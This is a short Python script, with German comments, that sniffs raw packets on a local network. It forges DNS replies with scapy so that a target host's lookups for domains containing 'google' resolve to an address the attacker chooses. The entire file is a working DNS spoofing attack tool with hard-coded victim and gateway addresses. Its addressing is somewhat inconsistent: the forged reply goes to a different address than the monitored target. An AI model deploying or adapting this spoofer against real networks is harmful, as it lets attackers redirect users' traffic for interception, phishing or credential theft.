#! /usr/bin/python3.7

# TODO: id stuff auf ip Level und ipv6 packets ignorieren/auch verarbeiten koennne
# TODO: mit scapy dns packet bilden und senden

import socket
import struct
from scapy.all import *

sniff = socket.socket(socket.AF_PACKET,socket.SOCK_RAW, socket.ntohs(3))
ider = 0


def inet_addr(saddr):
    saddr = saddr.split(".")
    baddr = int(saddr[0],10) * (256 ** 3)
    baddr += int(saddr[1],10) * (256 ** 2)
    baddr += int(saddr[2],10) * (256 ** 1)
    baddr += int(saddr[3],10) * (256 ** 0)
    return baddr

def ex_name(data,pos):
    name = ""
    while data[pos] != 0:
        name += chr(data[pos])
        pos += 1
    return name

def dns(data,port):
    id, flags, qds, ans = struct.unpack("! H H H H",data[:8])
    if qds == 0 or ans != 0:
        return
    domain = ex_name(data,12)
    qtype , qclass = struct.unpack("! H H",data[12+len(domain)+1:12+len(domain)+1+4])
    if "google" not in domain:
        return
    global ider
    global ntarget
    global ngateway
    packet = IP(id=ider + 1,src=ngateway,dst="192.168.178.87") 
    packet = packet / UDP(sport=53, dport=port)
    question = DNSQR(qname=domain,qtype=qtype,qclass=qclass)
    awnser = DNSRR(rrname=domain,type=1,rclass=1,ttl=10,rdlen=4,rdata="192.168.178.21")
    packet = packet / DNS(id=id,qr=1,aa=1,ad=1,qdcount=1,ancount=1,qd=question,an=awnser)
    send(packet)
    print("send for "+domain)


def udp(data,id,saddr,daddr):
    global gateway
    global ider
    src, dst = struct.unpack("! H H", data[:4])
    if dst == 53 and daddr == gateway:
        dns(data[8:],src)
    if saddr == gateway and src == 53:
        ider = id


def ip(data):
    global target
    global gateway
    f1, id, f2, proto, check, src, dst = struct.unpack("! 4s H 3s B H I I",data[:20])
    if proto != 17:
        return
    if src == target or dst == target:
        udp(data[20:],id,src,dst)

def ethernet(data):
    dst, src, proto = struct.unpack("! 6s 6s H", data[:14])
    if proto != 0x800:
        #if proto & 0x800:
        #print(hex(proto)+" maybe")
        return
    ip(data[14:])

ntarget = "192.168.178.21"
ngateway = "192.168.178.1"
target = inet_addr(ntarget)
gateway = inet_addr(ngateway)

while True:
    data, addr = sniff.recvfrom(65536)
    if len(data) < 54:
        continue
    ethernet(data)
